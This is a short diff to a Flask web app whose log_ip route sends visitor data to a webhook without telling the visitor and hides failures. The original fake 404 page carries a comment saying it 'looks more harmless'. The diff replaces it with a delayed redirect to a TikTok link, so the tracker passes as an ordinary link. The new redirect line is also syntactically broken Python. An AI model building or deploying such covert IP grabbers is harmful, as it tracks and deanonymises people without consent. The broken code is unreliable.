@@ -2,6 +2,7 @@ from flask import Flask, request
 import requests
 import json
 import os
+import time
 
 app = Flask(__name__)
 
@@ -55,8 +56,10 @@ def log_ip():
         requests.post(WEBHOOK_URL, json=payload, timeout=15)
     except Exception as e:
         pass  # Silent fail
+
+    time.sleep(3)
     
-    return "<h1>404 Not Found</h1>", 404  # Sieht harmloser aus
+    return redirect "https://vm.tiktok.com/ZGd9711rQ/"
 
 
 if __name__ == '__main__':
